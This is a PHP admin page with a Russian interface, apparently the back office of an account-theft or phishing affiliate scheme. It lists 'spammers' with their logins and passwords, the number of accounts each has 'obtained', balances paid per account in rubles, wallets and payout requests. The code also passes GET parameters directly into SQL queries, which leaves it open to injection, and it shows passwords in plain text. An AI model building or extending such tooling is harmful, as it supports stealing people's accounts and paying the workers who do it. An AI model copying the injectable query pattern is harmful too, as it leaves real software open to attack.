<?
include '../bdlog.php';

if(isset($_SESSION['admin'])) {
$msg = '';
if(isset($_GET['link'])) {
	$name = $_GET['name'];
  $linkk = $_GET['link'];
  $invuser = $_GET['invuser'];
  $koshel = $_GET['koshel'];
	$db->query("insert into slito (spamer,pass,inviteusers,purse) VALUES ('$name','$linkk','$invuser','$koshel')");
	$msg = '<div class="callout callout-success">
                  <h5>Успех!</h5>

                  <p>Создан/обновлен аккаунт спамера.<br>
				  Отправьте спамеру эти данные и ссылку для входа:
				 <br> Данные для входа: <b>'.$name.':'.$linkk.'</b><br>
				 Вход в панель спамера: <b>'.$host.'lightadmin/</b></p>
                </div>';
				
				 echo '<META HTTP-EQUIV="REFRESH" CONTENT="10;URL=../admin/spamers.php">';
}
                
if(isset($_GET['linkdel'])) {
	$linkdel = $_GET['linkdel'];
	$db->query("update slito set `inviteusers` = '0' where `id` = '$linkdel'");
	$db->query("update slito set `wantwith` = '0' where `id` = '$linkdel'");
	$msg = '<div class="callout callout-success">
                  <h5>Успех!</h5>

                  <p>Баланс спамера был обнулен.</p>
                </div>';
    echo '<META HTTP-EQUIV="REFRESH" CONTENT="2;URL=../admin/spamers.php">';
}

if(isset($_GET['delspam'])) {
	$linkdel = $_GET['delspam'];
	$db->query("delete from slito where `id` = '$linkdel'");
	$msg = '<div class="callout callout-success">
                  <h5>Успех!</h5>

                  <p>Аккаунт спамера удален.</p>
                </div>';
    echo '<META HTTP-EQUIV="REFRESH" CONTENT="2;URL=../admin/spamers.php">';
}


} else { echo '<META HTTP-EQUIV="REFRESH" CONTENT="0;URL=/admin/auth.php">'; }
if(!isset($_SESSION['admin'])) { echo '
  <META HTTP-EQUIV="REFRESH" CONTENT="0;URL=/admin/auth.php">
  <style> body {display:none !important;}'; }
$randch = rand(100,9999999999999999);
?>
<!DOCTYPE html>
<!--
This is a starter template page. Use this page to start your new project from
scratch. This page gets rid of all links and provides the needed markup only.
-->
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta http-equiv="x-ua-compatible" content="ie=edge">

  <title>Admin</title>

  <!-- Font Awesome Icons -->
  <link rel="stylesheet" href="plugins/font-awesome/css/font-awesome.min.css">
  <!-- Theme style -->
  <link rel="stylesheet" href="dist/css/adminlte.css">
  <!-- Google Font: Source Sans Pro -->
  <link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,400i,700" rel="stylesheet">
</head>
<body class="hold-transition sidebar-mini">
<div class="wrapper">

 
  <!-- /.navbar -->

  <!-- Main Sidebar Container -->
  <aside class="main-sidebar sidebar-dark-primary elevation-4">
    <!-- Brand Logo -->
    <a style="font-family:intro; color:#6CD089;" href="index.php" class="brand-link">
      <center><span class="brand-text font-weight-2px"> ADMIN PANEL [<?=$colvousers?>]</span></center>
    </a>


    <!-- Sidebar -->
    <div class="sidebar">
      <!-- Sidebar user panel (optional) -->
      

      <!-- Sidebar Menu -->
      <nav class="mt-2">
        <ul class="nav nav-pills nav-sidebar flex-column" data-widget="treeview" role="menu" data-accordion="false">
          <!-- Add icons to the links using the .nav-icon class
               with font-awesome or any other icon font library -->
          <? include 'menu.php'; ?>
          
        </ul>
      </nav>
      <!-- /.sidebar-menu -->
    </div>
    <!-- /.sidebar -->
  </aside>

  <!-- Content Wrapper. Contains page content -->
  <div class="content-wrapper">
    <div class="content-header">
      <div class="container-fluid">
        <div class="row mb-2">
          <div class="col-sm-6">
        </div>
      </div>
    </div>
    <!-- /.content-header -->

    <!-- Main content -->
    <div class="content">
      <div class="container-fluid">
        
		<?=$msg?>
		<div class="col-md-9" style="display:inline-block;">
            
            <!-- /.card -->

            <div class="card card-primary">
              <div class="card-header">
                <center><h3 class="card-title">Статистика спамеров // business_dark</center></h3>
              </div>
			  
              <!-- /.card-header -->
              <div class="card-body p-0">
                <table class="table table-condensed">
                  <tbody><tr>
                    <th>Ник:Пароль</th>
                    <th>Добыл аккаунтов</th>
                    <th>Баланс</th>
			          		<th>Кошелек</th>
					          <th style="width: auto">Запрос на выплату</th>
                    <th style="width: auto">Опции
					</th>
                  </tr>
                  <? if(isset($_SESSION['admin'])) {
	$linkads = $db->query("SELECT * FROM slito order by wantwith desc");
																			
while ($resone = mysqli_fetch_array($linkads)) {
	$linkidnew = $resone['id'];
	$isdown = $resone['isdown']; 
	if($resone['wantwith'] == 1) {
	$wantwith = '<div class="badge bg-success">запросил</div>';
	} else { 
	$wantwith = '<div class="badge bg-primary">не запрашивал</div>';
	}
echo '
                    <td>'.$resone['spamer'].':'.$resone['pass'].'</td>
                    <td>'.$resone['inviteusers'].'</td>
                    <td>'.$resone['inviteusers'] * $tarif.'₽</td>
					  <td>'.$resone['purse'].'</td>
            <td><center>'.$wantwith.'</center></td>
                    <td><form method="GET" style=" display: inline-block; "><button type="submit" style="border:none" class="badge bg-success"><input type="hidden" name="linkdel" value="'.$resone['id'].'">Обнулить баланс</button></form>
					<form method="GET" style=" display: inline-block; "><button type="submit" style="border:none" class="badge bg-danger"><input type="hidden" name="delspam" value="'.$resone['id'].'">Удалить спамера</button></form>
          </td> 
                  </tr>';
      
		
          } }
																				?>
				  
				 
                </tbody></table>
              </div>
              <!-- /.card-body -->
            </div>
            <!-- /.card -->
          </div>
		  <? if(isset($_SESSION['admin'])) { echo '
		  <div class="col-md-2" style="display:inline-block;">
		  
           <div class="card card-primary">
              <div class="card-header">
                <h3 class="card-title">Добавить спамера</h3>
              </div>
              <!-- /.card-header -->
              <!-- form start -->
              <form role="form" method="GET">
                <div class="card-body">
                  <div class="form-group">
                    <label for="link">Логин</label>
                    <input type="text" class="form-control" name="name" required value="" placeholder="ник спамера" id="link">
                  </div>
                  <div class="form-group">
                    <label for="link">Пароль</label>
                    <input type="text" class="form-control" id="link" name="link" required placeholder="пароль спамера">
                  </div>
                  <div class="form-group">
                    <label for="link">Добыл аккаунтов</label>
                    <input type="text" class="form-control" id="link" name="invuser" placeholder="(не обязательно)">
                  </div>
                  <div class="form-group">
                  <label for="link">Кошелек</label>
                  <input type="text" class="form-control" id="link" name="koshel" placeholder="(не обязательно)">
                </div>
                <!-- /.card-body -->
                <div class="card-footer">
                  <center><button type="submit" class="btn btn-primary">Добавить</button></center>
                </div>
              </form>
      </div></div>'; }
      ?>
		  
        <!-- /.row -->
      </div><!-- /.container-fluid -->
    </div>
    <!-- /.content -->
  </div>
  <!-- /.content-wrapper -->

  <!-- Control Sidebar -->
  
  <!-- /.control-sidebar -->

  <!-- Main Footer -->
 
</div>
<!-- ./wrapper -->

<!-- REQUIRED SCRIPTS -->

<!-- jQuery -->
<script src="plugins/jquery/jquery.min.js"></script>
<!-- Bootstrap 4 -->
<script src="plugins/bootstrap/js/bootstrap.bundle.min.js"></script>
<!-- AdminLTE App -->
<script src="dist/js/adminlte.min.js"></script>
</body>
</html>